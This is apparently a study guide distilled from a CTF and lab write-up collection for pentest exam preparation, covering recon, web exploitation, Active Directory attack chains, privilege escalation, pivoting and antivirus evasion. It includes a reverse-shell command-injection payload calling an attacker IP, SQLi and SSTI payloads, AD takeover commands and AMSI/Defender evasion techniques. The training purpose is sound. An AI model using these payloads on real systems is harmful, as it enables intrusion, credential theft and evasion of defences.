# What 233 of 0xb0b's write-ups actually teach

Source: <https://0xb0b.gitbook.io/writeups> — 243 pages indexed, 233 with real content, pulled
2026-08-29. TryHackMe (2023–2026), Hack Smarter Labs (2025–2026), HackTheBox (2023–2025), the THM
Red Team Capstone, and a few Webverse Pro boxes. The author's content is CC BY 4.0; this file is my
own distillation, not a copy.

How I read them: GitBook exposes `llms-full.txt` (the whole site as one markdown file) and a `.md`
export per page, so the corpus came down in two requests plus 138 page fetches — 3.9 MB. I read the
section-heading skeleton of **all 233** (complete coverage of every attack chain), the author's own
prose Summary for the **85** that have one, all 24 "failed attempt / unintended path" sections, and
206 sentences across the corpus where he says something didn't work. Tool and technique counts below
come from regex over the full text; I flag the two that are noisy.

Aimed at PT1. Where a technique is off-syllabus (kernel rootkits, smart contracts) I say so.

---

## 1. The thing worth stealing first: how he structures a write-up

This is the highest-value lesson in the whole corpus and it has nothing to do with exploitation.

Nearly every Hack Smarter box follows the same skeleton:

```
Scenario  →  Objective / Scope  →  Initial Access (what the client gave us)
Summary   →  one dense paragraph, the entire chain, no commands
Recon     →  one sub-section per host, then per service
Access as <user>            ← we hold valid credentials for this identity
Shell as <user>             ← we have interactive code execution as this identity
BloodHound Enumeration I / II / III
...
Recommendation              ← remediation, written for the client
```

Three things make that work:

**Sections are named after the identity you just gained, never the tool you used.** "Access as
j.bronski", not "Kerberoasting". The document then reads as the privilege ladder itself, and anyone
can see at a glance how many hops the box took. NovaCart has 14 such sections. North Stone has 9.

**"Access as" and "Shell as" are different words on purpose.** Access means you hold a credential
that authenticates. Shell means you are executing code as that identity. Boxes routinely give you
one without the other — `oscar.m`'s password reset worked but `STATUS_INVALID_LOGON_HOURS` blocked
the login until `logonHours` was cleared with bloodyAD (ShadowGate2); `tyler`'s cleartext password
was blocked by an account restriction so he requested a Kerberos TGT instead and authenticated from
the ticket cache (Past). Keeping the two words apart forces you to notice which one you are missing.

**BloodHound Enumeration is numbered, and it repeats.** I, II, III. Every new credential is a new
collection run, because BloodHound's answer to "shortest path to Domain Admin" changes with every
identity you own. In Fragments he says outright: *"At first glance, there doesn't seem to be a way to
become a Domain Admin here. At least, the query `Shortest path from Owned objects` or `Shortest path
to Domain Admins` doesn't reveal this to us."* — and the box still fell, through `bloodyAD get
writable` and five more hops. **A clean BloodHound graph is not a dead end; it means you have not
collected enough identities yet.**

The Summary paragraph is worth copying too. One paragraph, entire chain, no commands — written so a
reader can decide whether to read the rest. Mine end up as bullet lists; his don't, and his read
better.

---

## 2. Recon: he has three commands and he barely varies them

```bash
rustscan -b 500 -a <IP> --top -- -sC -sV -Pn     # 89 of his 98 rustscan runs carry -b 500 … -- -sC -sV -Pn
```

`-b 500` is the batch size (500 ports in flight); `--top` does the common ports first for a fast
answer (52 of the 98 runs), then he re-runs without it for all 65535. Everything after `--` is passed
to nmap: `-sC` runs the default script set, `-sV` fingerprints service versions, `-Pn` skips the ping
check (lab hosts routinely drop ICMP, and without `-Pn` nmap declares them down and scans nothing).

He calls rustscan 98 times against 19 direct nmap invocations. rustscan finds the open ports fast,
nmap then does the expensive work on only those ports. (nmap still appears in 181 write-ups — that's
its *output* being quoted, which is a different thing from him typing it.)

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u 'http://host/'
```

feroxbuster (50 write-ups) has overtaken gobuster (45) in his newer work — it recurses into
directories it finds, which is the whole point. `common.txt` first, `directory-list-lowercase-2.3-
medium.txt` when common comes up empty.

```bash
ffuf -w seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -H "Host: FUZZ.target.local" -u http://target.local -fw 3
```

Virtual-host fuzzing. A **vhost** is a second website served by the same IP, selected by the `Host:`
header, so it is invisible to a port scan and to directory brute-forcing. `-fw 3` filters out
responses with 3 words — the default "not found" page — so only real vhosts survive. **This is the
single highest-yield web recon step in the corpus: 28 write-ups turn on a vhost, 18 of them with
exactly this command.** Poppet found
`shop`, `crm`, `payroll`, then two more API vhosts disclosed inside the app. NoshRun found six.
AsterCheck found internal-only ones by abusing a URL-preview gateway as an SSRF proxy.

For Active Directory, netexec (`nxc`) is the workhorse — 317 command lines, far more than
anything else:

```bash
nxc smb <IP> -u guest -p '' --shares                  # what can an unauthenticated guest read?
nxc smb <IP> -u guest -p '' --rid                     # RID brute force → full domain user list
nxc smb <IP> -u guest -p '' --generate-hosts-file hosts
```

`--generate-hosts-file` writes the `/etc/hosts` entries for you. Kerberos breaks on IP addresses, so
this is not optional housekeeping — half the later commands fail without it.

**The recurring shape of his recon:** anonymous/guest SMB first (it works more often than you'd
think — Operation Endgame, MartiniAD, Past, Operation Promotion, ShadowGate all start there), and
when it fails, pivot to the web service and fuzz vhosts.

---

## 3. Web foothold: the ladder that actually recurs

Ordered by how often it appears, not by how clever it is.

**SQL injection into a login bypass (46 write-ups).** He tries the smallest payloads first and reads
the *difference* between responses, not the error message:

```
' AND 1=1-- -     → normal results
' AND 1=2-- -     → no results          ← injection confirmed, boolean-based
```

Login-bypass payloads that land repeatedly: `admin' --`, `' or 1 or '`, `' -- -`,
`admin' AND 1=1 -- -`. And when the app filters keywords, two bypasses show up more than once:
MySQL versioned comments `/*!50000SELECT*/` (Poppet) and doubled keywords `SSELECTELECT`,
`infoorrmation_schema` against a filter that strips the word once (Injectics).

**The verbose error is often the real prize.** North Stone's SQLi didn't need a UNION — the error
message leaked the database connection string, which gave MSSQL credentials directly. He notes his
own mistake there: *"I did this because I made the mistake of not reviewing the entire error log."*

**Server-side template injection, SSTI (17).** Confirm with `{{7*7}}`, and if that's filtered try
`{{7*'7'}}` → `7777777` (proves Jinja2 specifically). Filters get bypassed by case (`{{ ENV }}`
passed where `{{ env }}` was blocked, AsterCheck) and by hex-encoding attribute names inside an
`attr()` chain when `request`, `lipsum`, `cycler`, `joiner` and `namespace` are all blocked (Poppet).
EJS, Twig and Jinja2 all appear.

**Local file inclusion, LFI, into remote code execution (31).** The chains he actually uses:
- `file://` through an SSRF-style URL parameter (Message to Garcia, Plant Photographer)
- `/proc/self/environ` and `/proc/self/cmdline` to learn what the app is and where it lives, *before*
  guessing source paths
- PHP filter chains, and Chankro to get past `disable_functions` (Moebius)
- log poisoning via SSH or mail logs (Include) — though in Red it simply didn't work and he says so
- `....//` to defeat a filter that strips one literal `../` (NoshRun)

**Server-side request forgery, SSRF (19).** Almost always the bridge to something internal: cloud
metadata at `169.254.169.254` / `169.254.170.2`, an admin endpoint restricted to localhost, or
internal vhost enumeration. Operation Coldstart is the neatest: the allow-list only accepted
`kestrel.thm`, and `kestrel.thm` resolved to `127.0.0.1` in the server's own `/etc/hosts`, so the
check passed and the request still hit localhost.

**Command injection (68 write-ups by regex, though that count is inflated — treat it as "very
common").** His standard payload when outbound shells are awkward:

```bash
date$(busybox nc 10.x.x.x 4445 -e bash)
```

Command substitution instead of `;` or `|`, because those are the characters filters block first
(Athena: *"By trying to chain the commands using `&`, `|` or `;` we get the message 'Attempt
hacking!'"*). He catches shells with **Penelope** (`penelope -p 4445`, 22 occurrences) rather than
netcat — it upgrades the TTY automatically.

**Everything else, in rough order of appearance:** stored/blind XSS to steal an admin or moderator
cookie where a bot visits submitted content (32); JWT forgery — unsigned tokens, `alg:none`, or
cracking the signing key with hashcat mode 16500 (11); mass assignment, i.e. adding `role=warden` to
a profile update the app blindly binds (IronHold, Interceptor); password-reset abuse via
`X-Forwarded-Host` header poisoning (NoshRun) or brute-forcing a 4-digit code with no rate limiting
(Hammer, Verbose); prototype pollution via `__proto__` / `constructor.prototype` (Fools Mate
Revenge, Polution); insecure deserialization — Python `pickle.loads` on a session cookie (CTOS),
Java `ObjectInputStream` with ysoserial `CommonsCollections6` (IronHold); exposed `.git` directories
dumped with `git-dumper` (6); and race conditions using Burp's last-byte sync to fire parallel
requests (NoshRun).

---

## 4. Active Directory: the loop

This is where most of the corpus lives and where PT1 will spend most of its marks. The pattern is a
loop, not a list — and he runs it until the graph runs out.

```
get any identity  →  BloodHound collect  →  find an ACL/attribute you can abuse
      ↑                                              ↓
      └────────  new identity  ←  abuse it  ←────────┘
```

**Getting the first identity, with nothing:**
- guest / anonymous SMB, then `--rid` brute force for the user list (very common)
- AS-REP roasting: accounts with Kerberos pre-authentication disabled hand you a crackable hash for
  free. `GetNPUsers.py`, crack with hashcat `-m 18200`
- Kerberoasting: any account with a Service Principal Name (SPN). `GetUserSPNs.py -request`, hashcat
  `-m 13100`. Note `-no-preauth` lets you Kerberoast *without* credentials in some configurations
  (Triathlon's "blind Kerberoasting")
- **Timeroasting** — abuses Microsoft's NTP extension to pull SNTP hashes for *computer* accounts
  with no authentication at all. Appears in Past and Fragments. Worth knowing; it is not in most
  courses
- NTLM coercion: plant a file that forces a victim to authenticate to you. `ntlm_theft.py --generate
  modern --server <IP> --filename note` drops `.lnk`, `.url`, `.library-ms` and others into a
  writable share; catch with `responder -I tun0`. Used in City Council, ShadowGate2, NovaForge,
  Lumon (via CVE-2025-24054), Proxy
- `xp_dirtree` on a reachable MSSQL server does the same coercion from inside the database
  (North Stone, ShadowGate2)
- credentials in a downloadable client binary, an FTP onboarding doc, or SYSVOL scripts

**The ACL abuses, and the tool he reaches for.** `bloodyAD` (91 command lines) does nearly all of it:

```bash
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> set password  <target> 'Pwned123@!'
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> set owner     <target> <you>
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> add genericAll <target> <you>
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> add groupMember <group> <you>
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> get writable      # ← the underrated one
```

`get writable` is what saves boxes when BloodHound shows nothing: NovaForge found a *deleted* `m.lee`
object he could write to, restored it from the Deleted Objects container, and the whole chain opened
up. Recycle-bin and deleted-object forensics show up three times (NovaForge, NovaCart, ShadowGate2).

The chain is almost always: `WriteOwner` → take ownership → grant yourself `GenericAll` →
`ForceChangePassword` → next identity. Or `GenericWrite` → **targeted Kerberoasting** (write an SPN
onto the account, request its ticket, crack it, remove the SPN) using `targetedKerberoast.py`,
which appears 12 times and is a cleaner move than resetting a password because it is non-destructive.

**Shadow Credentials** (`certipy shadow auto`) is the other `GenericWrite` payoff — writes a
key to `msDS-KeyCredentialLink` and gets you the NT hash without touching the password. Also
non-destructive. He prefers both of these over password resets on real engagements, and says so.

**AD Certificate Services (ADCS), 19 write-ups.** `certipy find` then, by ESC number:
ESC1 (template lets you specify any subject), ESC3 (enrollment agent → request on behalf of anyone),
ESC4 (you can rewrite the template — reconfigure it into an ESC1 and use it), ESC7 (you hold CA
management rights — add yourself as officer, enable SubCA, approve your own request), ESC8 (web
enrollment accepts NTLM without channel binding — relay a coerced DC authentication into it),
ESC9, ESC13, and a "Stolen CA" attack where he backs up the CA's private key and forges a
certificate directly (Triathlon). This is the densest single topic in the corpus.

**Delegation.** Resource-Based Constrained Delegation (RBCD) is the recurring one:

```bash
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Pwned123@!' \
    -dc-host DC01 -domain-netbios <DOM> '<DOM>/user:pass'
rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action write '<DOM>/user:pass'
getST.py -spn 'cifs/DC01.domain' -impersonate 'Administrator' '<DOM>/ATTACKERSYSTEM$:Pwned123@!'
```

That is three commands from "I can write one attribute on the DC object" to a ticket as
Administrator. Then `KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ...`. Constrained
delegation with protocol transition (S4U2Self + S4U2Proxy) shows up in Proxy; NovaForge does an
exotic SPN-jacking variant with `-altservice` to retarget the ticket.

**Ending it:** `secretsdump.py` for DCSync once you hold `GetChanges`/`GetChangesAll`, then
pass-the-hash with `evil-winrm -i <DC> -u Administrator -H '<hash>'` — his single most-repeated
final command.

**Other AD moves worth having in the list:** GPO abuse with `pygpoabuse.py` against the Default
Domain Policy GUID `31B2F340-016D-11D2-945F-00C04FB984F9`; LAPS and gMSA password reads (12);
`BadSuccessor`, the Windows Server 2025 dMSA abuse (MidGarden2); DPAPI decryption of Credential
Manager blobs with `impacket dpapi.py` (City Council); and clearing `logonHours` or the
`ACCOUNTDISABLE` flag to make a reset account actually usable.

---

## 5. Linux privilege escalation

`linpeas` (24) and `pspy` (17) are the enumeration pair — pspy shows processes started by other
users without needing root, which is how every cron finding in the corpus was made.

What actually escalated, ranked by appearances:

- **`sudo -l` into GTFOBins.** `sudo find . -exec /bin/sh \; -quit` (Operation Promotion), nano/vim
  shell escapes out of a sudo-run editor (Exception), `--no-pager` escapes from systemctl.
- **Cron writing or reading a file you control.** Symlink `backup_config` → `/home/john/.ssh/id_rsa`
  and let root's backup script `cat` the key into a world-readable log (CTOS). Or plant a payload in
  a root-run script that is writable by you (Domino).
- **tar wildcard injection.** A cron running `tar czf ... *` in a directory you can write to: create
  files literally named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` and tar treats
  them as flags (Operation Coldstart). This is a classic and it appears twice.
- **The `disk` group.** Raw block-device access, so file permissions stop mattering:
  `debugfs -w /dev/nvme0n1p1` and read `/root/root.txt` straight out of the filesystem (Do Not
  Disturb, CTOS). Two boxes, same trick — worth remembering.
- **The `docker` group.** `docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash` (Dark).
- **SUID binaries, then reverse them.** He decompiles rather than guesses: a SUID wrapper around
  `mariadb-dump` with unsafe command construction (Samurai), a SUID binary with SQLi that reaches
  SQLite's `load_extension()` (Drive), a plugin loader with an undocumented `--dev` flag that loads
  from the current directory (CupidCards).
- **PATH hijacking** when a SUID binary calls something by relative path (Samurai, BankSmarter).
- **Credential reuse, over and over.** `.bash_history`, `config.php`, `conf.php`, `secret.config`,
  Firefox/Opera/Edge saved passwords, KeePass `.kdbx` files cracked with `keepass2john` + john.
  Base Camp is the best story: `.bash_history` contained `sudo su` followed immediately by the
  password, because the user forgot to press Enter.
- **Container escape** (11): `/.dockerenv` present, exposed Docker socket, `--privileged --pid=host`
  → `nsenter -t 1 -a` into PID 1's namespaces (Matryoshka).
- Kernel exploits appear (DirtyPipe, pwnkit, a fresh AF_ALG bug in Interceptor) but are usually
  flagged as unintended.

---

## 6. Windows privilege escalation

- **`SeImpersonatePrivilege` → SYSTEM.** The potato family: EfsPotato, DeadPotato, GodPotato,
  PrintSpoofer, RemotePotato0. This is the most common Windows escalation in the corpus. If you land
  as `iis apppool\defaultapppool` or `nt service\mssql$sqlexpress`, check `whoami /priv` first.
- **Service abuse.** Weak service permissions (`AllAccess` for `BUILTIN\Users`) → rewrite `binPath`
  and restart; unquoted service paths; missing DLL dependencies you can supply. Kiosk chains three
  of these in one box.
- **DLL hijacking / sideloading / proxying.** Sideload has the clearest treatment: Spartacus plus
  Procmon to find the missing DLL, then a *proxy* DLL that forwards the real exports so the host
  application keeps working while your code runs.
- **Credentials on disk:** `Unattend.xml` in `C:\Windows\Panther\`, WinLogon autologon registry keys
  (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`), `ConsoleHost_history.txt`,
  browser password stores, KeePass, `putty.conf`.
- **Enumeration tools he trusts because they don't get flagged:** `PrivescCheck.ps1` and `SharpUp`.
  He says explicitly that PrivescCheck was not detected where other tools were.

---

## 7. Pivoting

**ligolo-ng** is his default (15 write-ups), and the setup is identical every time:

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add <internal-subnet> dev ligolo
```

Then run the agent on the compromised host and `start` the tunnel on the proxy. The advantage over
port-forwarding is that the whole internal subnet becomes routable, so nmap, netexec and BloodHound
just work with no proxychains wrapper.

Dead Drop adds a detail worth keeping: add `/32` routes for individual hosts rather than the whole
`/24`, to avoid routing loops when the pivot host is itself inside that subnet.

Fallbacks he uses when ligolo is awkward: `chisel server --reverse --port 51234` with
`chisel client <IP>:51234 R:3306:127.0.0.1:3306`, plain `ssh -L`/`-D`, and `sshuttle` in the Red Team
Capstone. Backtrack notes SSH local forwarding was more stable than either ligolo or chisel on that
box — so the "best" tool is the one that survives the network you're on.

---

## 8. Cloud and CI/CD

Smaller than the AD material but growing in his 2026 work.

- **AWS:** IMDS via SSRF at `169.254.169.254` (and ECS task metadata at `169.254.170.2`); EC2
  `user-data` holding init scripts with credentials; Lambda environment variables; Secrets Manager;
  a world-writable S3 bucket serving the site's own `auth-module.js`, replaced with a credential
  stealer (Static — a clean client-side supply-chain compromise); Terraform state files in S3
  containing private keys (GitOops).
- **Azure / Entra:** managed identity on a VM → token → Key Vault; an over-privileged app
  registration with `UserAuthenticationMethod.ReadWrite.All` used to mint Temporary Access Passes and
  move laterally between users passwordlessly (Tapper); VM extensions to reset credentials on
  another VM (Hoppity Hop).
- **Cognito:** update your own email attribute to a *case variant* of the victim's, because the app
  keys on email instead of the OIDC `sub` claim (Incognito Travel). Lovely bug.
- **CI/CD:** Jenkins Script Console → Groovy reverse shell; Atlantis running `terraform apply` on a
  pull-request comment, so a `null_resource` with a `local-exec` provisioner is remote code execution
  as root (GitOops).

---

## 9. Antivirus evasion is a running theme, not a footnote

A surprising amount of the corpus is spent getting past Defender, and he documents every failure:

> "The first attempt was to compile EsfPotato on the machine; this worked, it did not get detected,
> but the exploit didn't work on this current version of Windows. The next attempt was to establish
> a connection to Sliver C2 [...] This wasn't detected at first, but the process was aborted during
> execution by Windows." — Fragments

What worked, repeatedly:
- **Write your own stager in Go or Nim.** Custom compiled binaries aren't in signature databases. He
  reuses one Go stager across Kiosk, North Stone, Staged and CTOS, including a service-aware variant
  that answers SCM control requests so the Windows service manager doesn't kill it.
- **Obfuscate known tools.** `InvisibilityCloak` to turn GodPotato into "BobTato" (Fragments),
  `Codecepticon` for Rubeus (MidGarden2) and SharpHound (Odyssey).
- **AMSI bypass before loading PowerShell tooling** — the Fabian Mosch reflection one-liner.
- **Choose tools that are already clean:** PrivescCheck over WinPEAS, specific GitHub release builds
  over the mainline binary (SHARE).

For PT1 this is probably over-depth, but the *habit* transfers: when something fails on target,
separate "my exploit is wrong" from "my exploit was blocked" before changing the exploit.

---

## 10. The wrong turns — what the failures have in common

206 sentences across the corpus admit something didn't work. Sorted into patterns:

**"At first glance it seems like a static site."** That exact phrase appears 39 times across 36 write-ups — North Stone, CTOS,
Chains of Love, Samurai, Operation Promotion, Silent Monitor, Dark, Poppet and on — and in nearly
every case the thing he was looking at was the way in. It is his tell for *I looked, saw nothing, and kept going anyway.*
The follow-up is always the same: fuzz vhosts, dump `.git`, read the JavaScript, check the error log.

**Not reading the whole output.** *"I did this because I made the mistake of not reviewing the entire
error log."* (North Stone). The information was already on screen.

**Running an exploit without reading it.** He calls this out as the lesson of an entire box:

> "This reinforces an important lesson: you must read and understand exploits to know what they
> actually do, what they might break, and to ensure they behave as expected in your target
> environment." — Exception

He then rewrites the public Rocket.Chat PoC function by function — email login → username login,
hardcoded values → CLI arguments, added a base64-wrapped reverse shell to dodge escaping problems.
That adaptation *is* the write-up.

**Tooling failing silently and being believed.** wpscan reported no plugins on a WordPress site that
had a vulnerable one; forcing plugin enumeration found it (Dark). MartiniAD: *"my collector did not
work properly, so we need to continue blind."* Volatility had no Linux profile at all, which was the
actual point of the challenge (Profiles). **A clean scan result is a claim about your tool, not
about the target.**

**Assuming the generic error means no enumeration.** Farewell and Lookup both open with "the login
returns a generic message, so users can't be enumerated" — and both are enumerable, through response
length or timing differences.

**LLM-generated scripts costing more than they saved.** Twice, explicitly: *"This script was
generated using ChatGPT. In the end, it would have been faster to write it independently, since GPT
made a lot of mistakes"* (Extracted), and a smart-contract script that failed on a wrong `gas` value
(Hack Back).

**Destructive moves with no undo.** Breakme: setting the role parameter wrong locks you out of the
dashboard permanently and you have to restart the machine. Worth thinking about before you fire a
password reset on a box you can't reset.

**Shell quoting.** ZSH mangling `!` inside a payload (Poppet); `echo` misbehaving after a shell
upgrade so he used `printf` instead (Weasel). Small, and they cost real time.

---

## 11. What the numbers say

Distinct write-ups mentioning each item, out of 233. Counts are regex-derived — good for ranking,
not exact.

| Tool | # | Technique | # |
|---|---|---|---|
| nmap | 181 | password cracking | 63 |
| curl | 75 | SQL injection | 46 |
| burp | 65 | BloodHound-driven path | 42 |
| feroxbuster | 50 | SUID / GTFOBins | 41 |
| netexec | 48 | vhost / subdomain | 28 |
| hashcat | 46 | XSS | 32 |
| gobuster | 45 | LFI / path traversal | 31 |
| bloodhound | 41 | pivoting / tunneling | 30 |
| ffuf | 37 | Kerberoasting | 28 |
| evil-winrm | 37 | GPO / ACL abuse | 28 |
| impacket | 32 | cron abuse | 26 |
| cyberchef | 30 | reverse engineering | 20 |
| smbclient | 29 | sudo abuse | 20 |
| john | 25 | ADCS ESC | 19 |
| hydra | 25 | SSRF | 19 |
| linpeas | 24 | capabilities | 18 |
| secretsdump | 21 | SSTI | 17 |
| sqlmap | 20 | Windows service/token | 16 |
| pspy | 17 | DCSync | 15 |
| ligolo | 15 | NTLM relay | 14 |
| certipy | 14 | file upload bypass | 13 |
| responder | 13 | deserialization | 12 |

Two counts I generated are unreliable and I've left them out of the table: "binary exploitation"
(154) matched on bare words like `GOT` and `heap`, and "crypto attack" (95) matched any mention of
RSA/AES/TLS. The genuinely pwn-heavy pages are few — TryPwnMe One, Obscure, T3, Snowy ARMageddon.

Hash modes he uses often enough to memorise: **13100** Kerberoast TGS-REP, **18200** AS-REP,
**1400** raw SHA-256, **1420** salted SHA-256, **16500** JWT HS256, **5600** NetNTLMv2.

---

## 12. Things to change in your own write-ups

Concrete, based on the gap between his and the ones in `content/writeups/`:

1. **Rename sections after the identity gained**, not the technique. "Shell as www-data" beats
   "Command Injection".
2. **Keep "Access as" and "Shell as" as separate words**, and say which one you have.
3. **Open with a one-paragraph Summary of the whole chain, no commands.** He does this on 85 boxes
   and it is the part most worth reading.
4. **Number your BloodHound runs** and re-run after every credential.
5. **Close with a Recommendation section.** Only 10 of his do it, but PT1 is a *report* exam and
   remediation writing is graded. This is the one place to be more disciplined than he is.
6. **Keep the failed attempt, and say what the real cause was.** You already do this; his best pages
   do it better by naming the rule that would have avoided it.

Worth adding to your own toolkit if not already there: `bloodyAD` (especially `get writable`),
`targetedKerberoast.py`, `ntlm_theft.py`, `penelope`, `rustscan`, `certipy`, `ligolo-ng`,
`PrivescCheck.ps1`, `git-dumper`, `flask-unsign`, `keepass2john`, `pygpoabuse.py`, and Timeroasting.
